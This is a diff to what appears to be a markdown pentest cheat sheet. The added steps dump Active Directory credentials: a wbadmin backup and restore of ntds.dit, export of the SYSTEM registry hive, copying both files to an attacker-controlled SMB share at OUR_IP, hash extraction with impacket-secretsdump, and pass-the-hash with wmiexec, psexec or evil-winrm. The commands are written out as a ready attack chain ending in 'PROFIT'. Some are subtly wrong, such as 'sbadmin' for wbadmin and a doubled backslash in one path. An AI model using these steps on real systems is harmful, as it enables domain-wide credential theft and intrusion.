@@ -26,4 +26,20 @@
 
 #### 2) net use k: \\OUR_IP\SHARE /user:smbuser smbpass (Mount the share)
 
-#### 3) echo "Y" | wbadmin start backup -backuptarget:\\OUR_IP\SHARE -include:c:\windows\ntds (Backup NTDS file)
+#### 3) echo "Y" | wbadmin start backup -backuptarget:\\OUR_IP\SHARE -include:c:\windows\ntds (Backup NTDS folder)
+
+#### 4) sbadmin get versions (Retrieve the version of the backup)
+
+#### 5) echo "Y" | wbadmin start recovery -version:10/01/2020-14:23 -itemtype:file -items:c:\windows\ntds\ntds.dit -recoverytarget:C:\ -notrestoreacl (Restore the NTDS file, specifying the backup version)
+
+#### 6) reg save HKLM\SYSTEM C:\system.hive (Export the system hive)
+
+#### 7) cp ntds.dit \\OUR_IP\SHARE\NTDS.dit
+
+#### 8) cp system.hive \\OUR_IP\\SHARE\system.hive
+
+#### 9) impacket-secretsdump -ntds NTDS.dit -system system.hive LOCAL
+
+#### 10) Do a Pass-the-Hash attack with wmiexec/smbexec/psexec or evil-winrm 
+
+#### 11) PROFIT
